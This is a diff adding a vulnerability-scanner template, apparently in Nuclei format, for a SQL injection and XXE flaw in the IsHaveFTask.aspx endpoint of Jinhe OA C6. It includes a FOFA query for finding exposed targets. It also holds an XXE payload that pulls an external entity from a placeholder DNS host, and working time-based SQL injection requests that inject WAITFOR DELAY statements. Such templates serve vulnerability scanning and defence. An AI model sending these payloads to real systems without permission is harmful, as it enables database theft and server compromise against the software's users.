@@ -1,0 +1,48 @@
+id: jinhe-oa-ishaveftask-sql
+info:
+  name: 金和OA IsHaveFTask.aspx 接口 SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="金和网络-金和OA"
+        金和网络作为专业信息化服务商，提供组织协同OA系统开发平台及电子政务解决方案。其C6版本Jhsoft.Web.dailytaskmanage模块中的IsHaveFTask.aspx接口存在SQL注入漏洞。攻击者可通过该漏洞提取数据库中的敏感信息（如管理员凭证、用户隐私数据），在特定权限条件下可能实现服务器端木马植入及系统权限获取。此外，同一接口存在XXE漏洞，可通过恶意XML实体读取服务器敏感文件或探测内网服务。
+        攻击示例：
+        POST /c6/Jhsoft.Web.dailytaskmanage/IsHaveFTask.aspx/ HTTP/1.1
+        Content-Type: application/xml
+        
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [
+        <!ENTITY % remote SYSTEM "http://
+        DNSURL
+        ">
+        %remote;]>
+        <root/>
+  tags: 金和OA
+http:
+- raw:
+  - |
+    POST /c6/Jhsoft.Web.dailytaskmanage/IsHaveFTask.aspx/ HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/xml
+
+    <root>
+      <Task>
+        <TaskIDList>3);WAITFOR DELAY'0:0:5'-- </TaskIDList>
+      </Task>
+    </root>
+  - |
+    POST /c6/Jhsoft.Web.dailytaskmanage/IsHaveFTask.aspx/ HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/xml
+
+    <root>
+      <Task>
+        <TaskIDList>3);WAITFOR DELAY'0:0:8'-- </TaskIDList>
+      </Task>
+    </root>
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
